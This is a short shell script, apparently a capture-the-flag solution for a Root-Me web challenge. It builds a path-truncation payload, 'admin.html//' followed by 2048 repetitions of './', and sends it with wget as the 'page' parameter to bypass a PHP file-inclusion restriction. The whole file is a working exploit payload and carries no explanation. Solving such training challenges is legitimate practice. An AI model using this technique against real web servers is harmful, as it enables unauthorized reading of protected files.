#!/bin/sh

page=$(python -c 'print "admin.html//" + "./"*2048')

url="http://challenge01.root-me.org/web-serveur/ch35/index.php?page=$page"
echo $url

wget -O- $url 2> /dev/null
